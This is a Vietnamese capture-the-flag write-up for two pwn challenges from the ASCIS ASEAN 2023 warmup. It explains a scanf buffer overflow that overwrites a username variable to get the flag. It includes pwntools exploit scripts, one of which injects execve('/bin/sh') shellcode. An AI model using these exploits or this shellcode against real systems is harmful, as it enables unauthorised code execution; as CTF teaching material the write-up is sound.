# ASCIS ASEAN 2023 WriteUp
## Đôi lời tâm sự:
Author: SeaWind (J4ckP0t)

Vì đây là vòng khởi động nên có thể năm nay các challenges về pwn có vẻ tương đối dễ thở. Cho nên hơn thua nhau ở các đội khi làm về mảng pwn là việc team nào giải ra nhanh hơn thôi :cold_sweat: 

Đối với mình thì tốc độ chưa bao giờ là lợi thế của mình, thường đối với một challenge dù dễ thì mình cũng cần mất tương đối thời gian mới có thể identify lỗi và exploit nó được. :face_with_head_bandage: 

Thôi tám chuyện vậy là đủ rồi, vào phần writeup thôi.
## Pwn1:
- Đề bài: [Challenge_link](https://warmup.ascis.vn/files/1e51e32a1d3b2caa96a46fc749772922/pwn?token=eyJ1c2VyX2lkIjozNjQ0LCJ0ZWFtX2lkIjo2NDMsImZpbGVfaWQiOjU4fQ.ZSGJRQ.FD4hStkqb5sR42vgzIG0yuOQoH8)
- Solution:

Đầu tiên ta sẽ tiến hành kiểm tra các mitigations của file challenge này.

![](https://hackmd.io/_uploads/r1hFsb1Wp.png)

Ở đây thì có mitigation của stack và PIE mitigation đã tắt (điều này sẽ có lợi cho lỗi bufferoverflow nên trong chương trình có tồn tại lỗi đó)

Tiếp đến ta sẽ check đến luồng thực thi và cấu trúc chương trình thông qua IDA Pro.

![](https://hackmd.io/_uploads/SkUmnZyWT.png)

Chương trình sẽ có 3 chức năng chính:

**1. Login():** (option=1) Hàm này sẽ tiến hành kiểm tra ta đã login chưa thông qua giá trị của biến old_user và old_passwd (Hàm này dường như không có ích gì trong việc khai thác lỗ hổng của ta)

![](https://hackmd.io/_uploads/rkY23Wkbp.png)

**2. Signup():** (option=2) Hàm này sẽ tiến hành đọc từ input của ta về username và passwd (trừ username = admin) và lưu giá trị vào trong biến old_user và old_passwd (Đây là hàm mà chúng ta sẽ tiến hành khai thác lỗ hỗng ở đây)

![](https://hackmd.io/_uploads/H1APpZk-p.png)

**3. getflag():** (option=4) Hàm này chính là hàm mà chúng ta hướng đến, hàm này sẽ kiểm tra giá trị của biến old_user có = với "admin" không. Nếu có thì sẽ leak ra flag cho chúng ta.

![](https://hackmd.io/_uploads/SJ_fCZ1ba.png)

Ở trong hàm Signup này thì ta thấy ngay được lỗ hổng buffer overflow ở ngay hàm `scanf('%s')` khi hàm này sẽ cho ta phép nhập input ở đến khi gặp dấu `'\n'` hoặc dấu `' '` (dấu xuống hàng và dấu khoảng trắng) ở trong input của cà username và passwd.

![](https://hackmd.io/_uploads/By5I1G1ZT.png)


![](https://hackmd.io/_uploads/SyVdkGyb6.png)

Ban đấu ý tưởng của mình là sử dụng lỗi buffer overflow này để tiến hành ghi đè địa chỉ của RIP ở điều hướng chương trình này sang hẳn hàm open flag trong hàm getflag luôn. Nhưng mà khổ nỗi là địa chỉ của hàm getflag ấy có chứa mã hex của `'\n'` nên căn bản là không thể ghi đè đầy đủ địa chỉ được đó.

Và mình đã rất chật vật để làm sao để có thể ghi đè địa chỉ RIP của hàm là địa chỉ của hàm getflag theo ý mình muốn nhưng mã không được.

Cho đến khi mình được gợi ý rằng là đối lúc chúng ta cần phải chơi đúng luật chơi một chút :V 

Căn bản là chúng ta vẫn sẽ khai thác lỗi buffer overflow nhưng chúng ta sẽ tiến hành ghi đè giá trị của biến `old_user` sẽ là "admin" thông qua việc kết hợp buffer overflow của input nhập passwd + hàm strncpy.

Tại sao mình lại có thể ghi đè được giá trị của biến `old_user` ư? Nếu ta để ý kỹ thì input của việc nhập username cũng như passwd của ta được lưu vào 2 biến local của hàm.

![](https://hackmd.io/_uploads/ryQ7fMJWp.png)

Trong đó ta thấy biến `src` (chứa input của nhập passwd) nằm trước biến `s1` (chứa input của nhập username) của ta cho nên nếu ta lặp đầy biến `src` 64 bytes + chuỗi string `admin` thì ta sẽ ghi đè giá trị trong biến local `s1`

Sau đó hàm strncpy sẽ lưu giá trị của biến `s1` vào trong biến `old_user` và `src` vào trong biến `old_passwd`



![](https://hackmd.io/_uploads/ryfMXGJba.png)

Giờ thì ta đã thành công truyền được string `admin` vào trong biến `old_user` rồi. Gọi hàm **getflag()** và in ra flag thôi.

- Answer: Đây là script giải bài của mình:
```python!=
from pwn import *
context.binary = "./pwn"
#p = process("139.180.137.100", 1337)
p = process()
p.sendline(b'2')
print(p.recv())
p.sendline(b'a')
print(p.recv())
p.sendline(cyclic(64)+b'admin')
print(p.recv())
#p.sendline(b'1')
#print(p.recv())
#p.sendline(cyclic(72)+p64(0x0000000000400aac))
p.sendline(b'4')
p.interactive()
```
## Pwn2:
- Đề bài: [Challenge_link](https://warmup.ascis.vn/files/c6ec92ba170edf460b4eec3f8dd9cf3e/pwn2?token=eyJ1c2VyX2lkIjozNjQ0LCJ0ZWFtX2lkIjo2NDMsImZpbGVfaWQiOjU5fQ.ZSGJ9A.JajO4Fjeg9uI0hpD9nYzv9FmzDE)
- Soluton:
- Answer: Đây là script để giải ra bài này của mình:
```python!=
from pwn import *
context.binary = "./pwn2"
p = process()
#p = remote("139.180.137.100", 1338)
#p = gdb.debug("./pwn2")
p.send(cyclic(0x32))
p.recv()
payload = b'\x90'*60
payload += b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
p.send(payload)
p.interactive()
```
